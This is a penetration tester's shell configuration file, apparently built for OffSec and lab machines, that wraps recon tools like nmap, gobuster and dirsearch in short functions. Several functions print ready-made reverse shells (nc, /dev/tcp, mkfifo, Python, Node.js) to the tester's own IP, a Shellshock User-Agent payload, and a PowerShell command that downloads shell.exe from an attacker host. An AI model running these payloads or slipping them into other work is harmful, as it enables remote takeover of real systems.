detailed_scan(){
echo "sudo nmap -sC -sV -Pn $1"
sudo nmap -sC -sV -Pn $1
}
all_port_detailed_scan(){
sudo nmap -sC -sV -Pn -p- $1
}
quick_scan(){
sudo nmap -sV -Pn $1 -p- --min-rate=10000
}
script_scan(){
sudo nmap --script vuln $1
}
gobuster_auto(){
gobuster dir -u http://$1/ -w /usr/share/wordlists/dirb/common.txt
}
nikto_auto(){
nikto -host http://$1/
}
quick_udpscan(){
sudo nmap -sU -p- --min-rate 10000 $1
}
udp-scan(){
sudo nmap -sC -sV -sU --top-ports=20 $1
}
incomming_ping(){
sudo tcpdump -ni tun0 icmp
}
scpd(){
scp -r pentest@192.168.0.104:~/tools ~/tmp
}
decode(){
echo "$1" | base64 -d
}
encode(){
echo "$1" | base64
}
py_module_upgrade(){
echo "sudo pip3 install requests --upgrade"
}
webup(){
ls
echo ""
echo "wget http://`ifconfig | grep 192.168.0.* | awk '{print $2}'`:8000/"
python -m http.server
}
copy(){
searchsploit -m $1
}

loop(){
ip addr | grep "scope host lo" |awk '{print "lo-"$2}'
}
eth0(){
ip addr | grep "scope global dynamic" |awk '{print "eth0-"$2}'
}
tun0(){
ip addr | grep "scope global tun0" |awk '{print "tun0-"$2}'
}

ips(){
loop
eth0
tun0
}

#Open Jxplorer for ldap enumeration
openldap(){
cd ~/jxplorer
./jxplorer.sh&
}

#Some bash scipt
ping_swipe(){
"for ip in $(seq 1 254); do ping -c 1 192.168.56.$ip; done"
}

port_scan(){
'for i in $(seq 1 65535); do nc -nvz -w 1 192.168.56.<ip> $i 2>&1; done | grep -v "Connection refused"'
}

#Change java openJDK version
change_java(){
sudo update-alternatives --config java
}
#Connect Office VPN
office_vpn(){
sudo openvpn /home/kali/Pentest/koushick@cyber-vpn.conf
}
powershell-download(){
tar1=powershell
tar2=" (New-Object System.Net.WebClient).Downloadfile('http://10.10.14.2:8000/shell.exe','shell.exe')"
echo -e $tar1$tar2
}
empty_ssh(){
echo "" > ~/.ssh/known_hosts
}
tmp(){
cd ~/tmp
}
shellshock(){
curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'bash -i >& /dev/tcp/10.10.14.2/5555 0>&1'" \"
}
pattern(){
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l $1
}
poffset(){
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l $1 -q $2
}
compile-gcc(){
gcc $1 -o $2 -no-pie -z execstack -m32
}
page(){
mousepad $1&
}
his(){
history | grep "$1"
}
linf(){
cd ~/LinEnum
}
startssh(){
sudo service ssh start
}
startapache2(){
sudo service apache2 start
}
statusapache2(){
sudo service apache2 status
}
restartapache2(){
sudo service apache2 restart
}
apache2log(){
sudo tail /var/log/apache2/access.log
}
decode_jwt(){
python ~/tools/jwt_tool/jwt_tool.py $1
}
tamper_jwt(){
python ~/tools/jwt_tool/jwt_tool.py -T $1
}
find_word(){
grep -Rnw '.' -e '$1'
}
newclient(){
cd ~/VulnHub
mkdir $1
cd ~/VulnHub/$1
}
enumerate_ip(){
sudo nmap -sC -sV -Pn $1 | tee Nmap.txt
nikto -host $1 | tee Nikto.txt
# Dir
if [ $(grep -ic "80/tcp" Nmap.txt) -eq 1 ]
then
        echo "Port 80"
        dirsearch -u http://$1/ -w ~/tools/SecLists/Discovery/Web-Content/raft-medium-files.txt -x 404 --exclude-sizes=0B | tee FileDiscovery.txt
else
        echo "Port 443"
        dirsearch -u https://$1/ -w ~/tools/SecLists/Discovery/Web-Content/raft-medium-files.txt -x 404 --exclude-sizes=0B | tee FileDiscovery.txt
fi
dirsearch -u https://$1/ -w ~/tools/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x 404 --exclude-sizes=0B | tee DirectoryDiscovery.txt
}
update_tools(){
sudo pip3 install --upgrade wfuzz
}
info-in-image(){
steghide extract -sf $1
}
#IP-PORT
iport(){
IP=$(ifconfig | grep 192.168.0.* | awk '{print $2}')
# random port generate.
PORT=$(shuf -i 2000-65000 -n 1)
echo $IP":"$PORT
}

# Reverse Shell
rev-shell(){
IP=$(ifconfig | grep 192.168.0.* | awk '{print $2}')
# random port generate.
PORT=$(shuf -i 2000-65000 -n 1)
echo "nc -e /bin/bash $IP $PORT"
echo "bash -i >& /dev/tcp/$IP/$PORT 0>&1"
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $IP $PORT >/tmp/f"

}
# Python reverse shell
py-rev-shell(){
IP=$(ifconfig | grep 192.168.0.* | awk '{print $2}')
# random port generate.
PORT=$(shuf -i 2000-65000 -n 1)
echo "python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$IP",$PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'"
echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$IP",$PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'"
echo "python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$IP",$PORT));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'"
}
# NodeJS Reverse Shell
node-rev-shell(){
echo "echo "require('child_process').exec('nc -nv 192.168.49.51 9090 -e /bin/bash')" > /var/tmp/offsec.js ; node /var/tmp/offsec.js"
}

# Listener
lis(){
echo "nc -nlvp $1"
nc -nlvp $1
}
# Navigate to PostExploitation
postexp(){
cd /home/kali/Organize/Platform/PostExploitation
ls -l
}
#SMTP user enumeration
smtp4user(){
smtp-user-enum -M VRFY -U ~/tools/SecLists/Usernames/Names/names.txt -t $1
}


# For WebApps
# All Fuzzers
all-fuzzers(){
echo "ffuf -u "http://$IP/FUZZ" -w ~/tools/SecLists/Fuzzing/XSS-Fuzzing -fs 0 -fc 404,403"
echo 'wfuzz -c -z file,tools/SecLists/Fuzzing/XSS-Fuzzing --hh 40060 "http://offsecwp/?xss=FUZZ"'
echo "gobuster dir -u http://$IP/ -w <wordlist_file>"
}

# Encode - Decode
urldecode(){
echo ""
python ~/Organize/Platform/WebApp/url-decode.py $1
}
urlencode(){
python ~/Organize/Platform/WebApp/url-encode.py $1
}

cmkdir(){
mkdir $1
cd $1
}

updatedb(){
sudo updatedb
}

offsec-vpn(){
sudo openvpn ~/OffSec/OSWA/universal.ovpn
}

bash-for(){
echo "for i in {0..100}; do echo $i; done >> numbers.txt"
}
# Status Code
scode(){
cat ~/Organize/Platform/Linux/status-code.txt | grep "$1"
}

# Crawl Website using Hakrawler
crawl(){
# echo "http://192.168.182.126/" | hakrawler -d 2 -u | grep -v -E "assets|.com"
echo http://$1/ | hakrawler -d 2 -u | grep -v -E "$2|$3"
}
